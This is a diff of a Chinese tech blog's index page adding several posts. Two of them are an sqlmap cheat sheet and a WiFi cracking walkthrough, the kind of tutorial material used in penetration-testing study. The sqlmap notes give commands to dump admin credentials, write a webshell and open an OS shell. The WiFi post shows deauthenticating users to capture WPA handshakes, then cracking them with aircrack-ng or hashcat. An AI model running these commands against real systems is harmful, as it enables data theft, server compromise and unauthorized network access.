@@ -321,6 +321,824 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://dravinbox.github.io/2018/03/14/mysql-index/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Dravin">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dravin's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/03/14/mysql-index/" itemprop="url">mysql 索引</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-14T09:23:30+08:00">
+                2018-03-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/sqlmap/" itemprop="url" rel="index">
+                    <span itemprop="name">sqlmap</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://dravinbox.github.io/2018/03/11/sqlmap-note/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Dravin">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dravin's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/03/11/sqlmap-note/" itemprop="url">sqlmap精华笔记</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-11T23:10:29+08:00">
+                2018-03-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/sqlmap/" itemprop="url" rel="index">
+                    <span itemprop="name">sqlmap</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="sqlmap笔记"><a href="#sqlmap笔记" class="headerlink" title="sqlmap笔记"></a>sqlmap笔记</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>sqlmap支持五种不同的注入模式：<br>1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。<br>2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。<br>3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。<br>4、联合查询注入，可以使用union的情况下的注入。<br>5、堆查询注入，可以同时执行多条语句的执行时的注入。</p>
+<p>支持的数据库有：<br>MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB</p>
+<h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><h3 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h3><p>sqlmap -u “<a href="http://www.vuln.cn/post.php?id=1" target="_blank" rel="noopener">http://www.vuln.cn/post.php?id=1</a>“<br>默认使用level1检测全部数据库类型<br>sqlmap -u “<a href="http://www.vuln.cn/post.php?id=1" target="_blank" rel="noopener">http://www.vuln.cn/post.php?id=1</a>“  –dbms mysql –level 3<br>指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）</p>
+<h3 id="跟随302跳转"><a href="#跟随302跳转" class="headerlink" title="跟随302跳转"></a>跟随302跳转</h3><p> 当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，<br>当注入错误的时候，先报错再跳转的时候，不需要跟随302。<br>目的就是：要追踪到错误信息。</p>
+<h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>当程序有防get注入的时候，可以使用cookie注入<br>sqlmap -u “<a href="http://www.baidu.com/shownews.asp" target="_blank" rel="noopener">http://www.baidu.com/shownews.asp</a>“ –cookie “id=11” –level 2（只有level达到2才会检测cookie）</p>
+<h3 id="从post数据包中注入"><a href="#从post数据包中注入" class="headerlink" title="从post数据包中注入"></a>从post数据包中注入</h3><p>可以使用burpsuite或者temperdata等工具来抓取post包<br>sqlmap -r “c:\tools\request.txt” -p “username” –dbms mysql    指定username参数</p>
+<h2 id="注入成功后"><a href="#注入成功后" class="headerlink" title="注入成功后"></a>注入成功后</h2><h3 id="获取数据库基本信息"><a href="#获取数据库基本信息" class="headerlink" title="获取数据库基本信息"></a>获取数据库基本信息</h3><p>sqlmap -u “<a href="http://www.vuln.cn/post.php?id=1" target="_blank" rel="noopener">http://www.vuln.cn/post.php?id=1</a>“  –dbms mysql –level 3 –dbs<br>查询有哪些数据库<br>sqlmap -u “<a href="http://www.vuln.cn/post.php?id=1" target="_blank" rel="noopener">http://www.vuln.cn/post.php?id=1</a>“  –dbms mysql –level 3 -D test –tables<br>查询test数据库中有哪些表<br>sqlmap -u “<a href="http://www.vuln.cn/post.php?id=1" target="_blank" rel="noopener">http://www.vuln.cn/post.php?id=1</a>“  –dbms mysql –level 3 -D test -T admin –columns<br>查询test数据库中admin表有哪些字段<br>sqlmap -u “<a href="http://www.vuln.cn/post.php?id=1" target="_blank" rel="noopener">http://www.vuln.cn/post.php?id=1</a>“  –dbms mysql –level 3 -D test -T admin -C “username,password” –dump<br>dump出字段username与password中的数据<br>其他命令参考下面</p>
+<h3 id="从数据库中搜索字段"><a href="#从数据库中搜索字段" class="headerlink" title="从数据库中搜索字段"></a>从数据库中搜索字段</h3><p>sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password<br>在dedecms数据库中搜索字段admin或者password。</p>
+<h3 id="读取与写入文件"><a href="#读取与写入文件" class="headerlink" title="读取与写入文件"></a>读取与写入文件</h3><p>首先找需要网站的物理路径，其次需要有可写或可读权限。<br>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）<br>–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）<br>–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径<br>示例：<br>sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”<br>使用shell命令：<br>sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell<br>接下来指定网站可写目录：<br>“E:\php\htdocs\dvwa”<br>注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）</p>
+<h2 id="sqlmap详细命令："><a href="#sqlmap详细命令：" class="headerlink" title="sqlmap详细命令："></a>sqlmap详细命令：</h2><p>–is-dba 当前用户权限（是否为root权限）<br>–dbs 所有数据库<br>–current-db 网站当前数据库<br>–users 所有数据库用户<br>–current-user 当前数据库用户<br>–random-agent 构造随机user-agent<br>–passwords 数据库密码<br>–proxy <a href="http://local:8080" target="_blank" rel="noopener">http://local:8080</a> –threads 10 (可以自定义线程加速) 代理<br>–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</p>
+<h3 id="Options（选项）："><a href="#Options（选项）：" class="headerlink" title="Options（选项）："></a>Options（选项）：</h3><p>–version 显示程序的版本号并退出<br>-h, –help 显示此帮助消息并退出<br>-v VERBOSE 详细级别：0-6（默认为1）<br>保存进度继续跑：<br>sqlmap -u “<a href="http://url/news?id=1“" target="_blank" rel="noopener">http://url/news?id=1“</a> –dbs-o “sqlmap.log” 保存进度<br>sqlmap -u “<a href="http://url/news?id=1“" target="_blank" rel="noopener">http://url/news?id=1“</a> –dbs-o “sqlmap.log” –resume 恢复已保存进度</p>
+<h3 id="Target（目标）："><a href="#Target（目标）：" class="headerlink" title="Target（目标）："></a>Target（目标）：</h3><p>以下至少需要设置其中一个选项，设置目标URL。<br>-d DIRECT 直接连接到数据库。<br>-u URL, –url=URL 目标URL。<br>-l LIST 从Burp或WebScarab代理的日志中解析目标。<br>-r REQUESTFILE 从一个文件中载入HTTP请求。<br>-g GOOGLEDORK 处理Google dork的结果作为目标URL。<br>-c CONFIGFILE 从INI配置文件中加载选项。</p>
+<h3 id="Request（请求）："><a href="#Request（请求）：" class="headerlink" title="Request（请求）："></a>Request（请求）：</h3><p>这些选项可以用来指定如何连接到目标URL。<br>–data=DATA 通过POST发送的数据字符串<br>–cookie=COOKIE HTTP Cookie头<br>–cookie-urlencode URL 编码生成的cookie注入<br>–drop-set-cookie 忽略响应的Set - Cookie头信息<br>–user-agent=AGENT 指定 HTTP User - Agent头<br>–random-agent 使用随机选定的HTTP User - Agent头<br>–referer=REFERER 指定 HTTP Referer头<br>–headers=HEADERS 换行分开，加入其他的HTTP头<br>–auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)<br>–auth-cred=ACRED HTTP身份验证凭据（用户名:密码）<br>–auth-cert=ACERT HTTP认证证书（key_file，cert_file）<br>–proxy=PROXY 使用HTTP代理连接到目标URL<br>–proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）<br>–ignore-proxy 忽略系统默认的HTTP代理<br>–delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒<br>–timeout=TIMEOUT 等待连接超时的时间（默认为30秒）<br>–retries=RETRIES 连接超时后重新连接的时间（默认3）<br>–scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式<br>–safe-url=SAFURL 在测试过程中经常访问的url地址<br>–safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL</p>
+<h3 id="Enumeration（枚举）："><a href="#Enumeration（枚举）：" class="headerlink" title="Enumeration（枚举）："></a>Enumeration（枚举）：</h3><p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行<br>您自己的SQL语句。<br>-b, –banner 检索数据库管理系统的标识<br>–current-user 检索数据库管理系统当前用户<br>–current-db 检索数据库管理系统当前数据库<br>–is-dba 检测DBMS当前用户是否DBA<br>–users 枚举数据库管理系统用户<br>–passwords 枚举数据库管理系统用户密码哈希<br>–privileges 枚举数据库管理系统用户的权限<br>–roles 枚举数据库管理系统用户的角色<br>–dbs 枚举数据库管理系统数据库<br>-D DBname 要进行枚举的指定数据库名<br>-T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）<br>–tables 枚举的DBMS数据库中的表<br>–columns 枚举DBMS数据库表列<br>–dump 转储数据库管理系统的数据库中的表项<br>–dump-all 转储所有的DBMS数据库表中的条目<br>–search 搜索列（S），表（S）和/或数据库名称（S）<br>-C COL 要进行枚举的数据库列<br>-U USER 用来进行枚举的数据库用户<br>–exclude-sysdbs 枚举表时排除系统数据库<br>–start=LIMITSTART 第一个查询输出进入检索<br>–stop=LIMITSTOP 最后查询的输出进入检索<br>–first=FIRSTCHAR 第一个查询输出字的字符检索<br>–last=LASTCHAR 最后查询的输出字字符检索<br>–sql-query=QUERY 要执行的SQL语句<br>–sql-shell 提示交互式SQL的shell</p>
+<h3 id="Optimization（优化）："><a href="#Optimization（优化）：" class="headerlink" title="Optimization（优化）："></a>Optimization（优化）：</h3><p>这些选项可用于优化SqlMap的性能。<br>-o 开启所有优化开关<br>–predict-output 预测常见的查询输出<br>–keep-alive 使用持久的HTTP（S）连接<br>–null-connection 从没有实际的HTTP响应体中检索页面长度<br>–threads=THREADS 最大的HTTP（S）请求并发量（默认为1）</p>
+<h3 id="Injection（注入）："><a href="#Injection（注入）：" class="headerlink" title="Injection（注入）："></a>Injection（注入）：</h3><p>这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。<br>-p TESTPARAMETER 可测试的参数（S）<br>–dbms=DBMS 强制后端的DBMS为此值<br>–os=OS 强制后端的DBMS操作系统为这个值<br>–prefix=PREFIX 注入payload字符串前缀<br>–suffix=SUFFIX 注入payload字符串后缀<br>–tamper=TAMPER 使用给定的脚本（S）篡改注入数据</p>
+<h3 id="Detection（检测）："><a href="#Detection（检测）：" class="headerlink" title="Detection（检测）："></a>Detection（检测）：</h3><p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。<br>–level=LEVEL 执行测试的等级（1-5，默认为1）<br>–risk=RISK 执行测试的风险（0-3，默认为1）<br>–string=STRING 查询时有效时在页面匹配字符串<br>–regexp=REGEXP 查询时有效时在页面匹配正则表达式<br>–text-only 仅基于在文本内容比较网页</p>
+<h3 id="Techniques（技巧）："><a href="#Techniques（技巧）：" class="headerlink" title="Techniques（技巧）："></a>Techniques（技巧）：</h3><p>这些选项可用于调整具体的SQL注入测试。<br>–technique=TECH SQL注入技术测试（默认BEUST）<br>–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）<br>–union-cols=UCOLS 定列范围用于测试UNION查询注入<br>–union-char=UCHAR 用于暴力猜解列数的字符</p>
+<h3 id="Fingerprint（指纹）："><a href="#Fingerprint（指纹）：" class="headerlink" title="Fingerprint（指纹）："></a>Fingerprint（指纹）：</h3><p>-f, –fingerprint 执行检查广泛的DBMS版本指纹</p>
+<h3 id="Brute-force（蛮力）："><a href="#Brute-force（蛮力）：" class="headerlink" title="Brute force（蛮力）："></a>Brute force（蛮力）：</h3><p>这些选项可以被用来运行蛮力检查。<br>–common-tables 检查存在共同表<br>–common-columns 检查存在共同列<br>User-defined function injection（用户自定义函数注入）：<br>这些选项可以用来创建用户自定义函数。<br>–udf-inject 注入用户自定义函数<br>–shared-lib=SHLIB 共享库的本地路径</p>
+<h3 id="File-system-access（访问文件系统）："><a href="#File-system-access（访问文件系统）：" class="headerlink" title="File system access（访问文件系统）："></a>File system access（访问文件系统）：</h3><p>这些选项可以被用来访问后端数据库管理系统的底层文件系统。<br>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件<br>–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件<br>–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</p>
+<h3 id="Operating-system-access（操作系统访问）："><a href="#Operating-system-access（操作系统访问）：" class="headerlink" title="Operating system access（操作系统访问）："></a>Operating system access（操作系统访问）：</h3><p>这些选项可以用于访问后端数据库管理系统的底层操作系统。<br>–os-cmd=OSCMD 执行操作系统命令<br>–os-shell 交互式的操作系统的shell<br>–os-pwn 获取一个OOB shell，meterpreter或VNC<br>–os-smbrelay 一键获取一个OOB shell，meterpreter或VNC<br>–os-bof 存储过程缓冲区溢出利用<br>–priv-esc 数据库进程用户权限提升<br>–msf-path=MSFPATH Metasploit Framework本地的安装路径<br>–tmp-path=TMPPATH 远程临时文件目录的绝对路径</p>
+<h3 id="Windows注册表访问："><a href="#Windows注册表访问：" class="headerlink" title="Windows注册表访问："></a>Windows注册表访问：</h3><p>这些选项可以被用来访问后端数据库管理系统Windows注册表。<br>–reg-read 读一个Windows注册表项值<br>–reg-add 写一个Windows注册表项值数据<br>–reg-del 删除Windows注册表键值<br>–reg-key=REGKEY Windows注册表键<br>–reg-value=REGVAL Windows注册表项值<br>–reg-data=REGDATA Windows注册表键值数据<br>–reg-type=REGTYPE Windows注册表项值类型<br>这些选项可以用来设置一些一般的工作参数。<br>-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中<br>-s SESSIONFILE 保存和恢复检索会话文件的所有数据<br>–flush-session 刷新当前目标的会话文件<br>–fresh-queries 忽略在会话文件中存储的查询结果<br>–eta 显示每个输出的预计到达时间<br>–update 更新SqlMap<br>–save file保存选项到INI配置文件<br>–batch 从不询问用户输入，使用所有默认配置。</p>
+<h3 id="Miscellaneous（杂项）："><a href="#Miscellaneous（杂项）：" class="headerlink" title="Miscellaneous（杂项）："></a>Miscellaneous（杂项）：</h3><p>–beep 发现SQL注入时提醒<br>–check-payload IDS对注入payloads的检测测试<br>–cleanup SqlMap具体的UDF和表清理DBMS<br>–forms 对目标URL的解析和测试形式<br>–gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果<br>–page-rank Google dork结果显示网页排名（PR）<br>–parse-errors 从响应页面解析数据库管理系统的错误消息<br>–replicate 复制转储的数据到一个sqlite3数据库<br>–tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址<br>–wizard 给初级用户的简单向导界面</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://dravinbox.github.io/2018/03/11/aircrack-ng/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Dravin">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dravin's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/03/11/aircrack-ng/" itemprop="url">无线WIFI破解</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-11T17:16:21+08:00">
+                2018-03-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/aircrack-ng/" itemprop="url" rel="index">
+                    <span itemprop="name">aircrack-ng</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="无线WIFI破解"><a href="#无线WIFI破解" class="headerlink" title="无线WIFI破解"></a>无线WIFI破解</h1><h2 id="检测网卡"><a href="#检测网卡" class="headerlink" title="检测网卡"></a>检测网卡</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iwconfig</span><br></pre></td></tr></table></figure>
+<h2 id="查看周围网络"><a href="#查看周围网络" class="headerlink" title="查看周围网络"></a>查看周围网络</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0</span><br></pre></td></tr></table></figure>
+<h2 id="开始抓握手包"><a href="#开始抓握手包" class="headerlink" title="开始抓握手包"></a>开始抓握手包</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump -w [写出名字] -c [通道数字] --bssid [bssid码] wlan0</span><br></pre></td></tr></table></figure>
+<p>由于握手包是有人连接路由时才产生的，所以一直等待也不是办法，于是就要尝试断开已有的用户，让他们重新连接路由，由此在网络中产生握手包</p>
+<h2 id="强制中断用户"><a href="#强制中断用户" class="headerlink" title="强制中断用户"></a>强制中断用户</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -0 0 -a [bssid码] wlan0</span><br></pre></td></tr></table></figure>
+<p>一旦在嗅探页面出现 WPA handshake 字样，就抓到了该无线网的握手包</p>
+<h2 id="使用字典爆破握手包"><a href="#使用字典爆破握手包" class="headerlink" title="使用字典爆破握手包"></a>使用字典爆破握手包</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng [拿到的<span class="built_in">cap</span>文件] -w [字典路径]</span><br></pre></td></tr></table></figure>
+<p>或使用hashcat</p>
+<p>先把cap文件转为hccapx文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cap2hccapx.bin ~/Desktop/hccap_files/01.cap ~/Desktop/hccap_files/fdf6.hccap</span><br></pre></td></tr></table></figure></p>
+<p>再使用hashcat 破解<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 2500 -a 0 -o ./outfile.txt --outfile-format=2 xxxhccap words.txt</span><br></pre></td></tr></table></figure></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://dravinbox.github.io/2018/03/11/nginx-php/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Dravin">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dravin's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/03/11/nginx-php/" itemprop="url">nginx-Thinkphp配置</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-11T11:08:49+08:00">
+                2018-03-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/nginx/" itemprop="url" rel="index">
+                    <span itemprop="name">nginx</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/nginx/nginx-php5-6/" itemprop="url" rel="index">
+                    <span itemprop="name">nginx-php5.6</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Nginx-Thinkphp-配置"><a href="#Nginx-Thinkphp-配置" class="headerlink" title="Nginx + Thinkphp 配置"></a>Nginx + Thinkphp 配置</h1><p>新版本的nginx有一个自带的函数可以处理pathinfo，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">location ~ .php(.*)$ &#123;</span><br><span class="line">    fastcgi_pass   unix:/tmp/php-cgi.sock;</span><br><span class="line">    fastcgi_index  index.php;</span><br><span class="line">    fastcgi_split_path_info ^(.+.php)(.*)$;</span><br><span class="line">    fastcgi_param   PATH_INFO       $fastcgi_path_info;</span><br><span class="line">    fastcgi_param   SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class="line">    fastcgi_param   PATH_TRANSLATED $document_root$fastcgi_path_info;</span><br><span class="line">    include        fastcgi_params;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://dravinbox.github.io/2018/03/08/jvm-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Dravin">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dravin's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/03/08/jvm-1/" itemprop="url">JVM虚拟机</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-08T20:05:38+08:00">
+                2018-03-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/JVM/" itemprop="url" rel="index">
+                    <span itemprop="name">JVM</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><ol>
+<li>java虚拟机概述和基本概念</li>
+<li>堆，栈，方法区</li>
+<li>了解虚拟机参数</li>
+<li>垃圾回收概念和算法，及对象的分代转换</li>
+<li>垃圾收集器</li>
+<li>Tomcat性能影响实验</li>
+<li>性能监控工具</li>
+</ol>
+<h2 id="1-1-java-虚拟机的原理"><a href="#1-1-java-虚拟机的原理" class="headerlink" title="1.1 java 虚拟机的原理"></a>1.1 java 虚拟机的原理</h2><p>所谓虚拟机，就是一台虚拟的机器，它是一款软件，用来执行一系列虚拟计算机指令。大体上虚拟机分为系统虚拟机和程序虚拟机，Visual Box ，VMware就属于系统虚拟机。完全是对无力计算机的仿真，提供一个可运行完整操作系统的软件品台。<br>程序虚拟机典型代表就是java虚拟机，它专门为执行单个计算机程序而设计，在java虚拟机中执行的指令。</p>
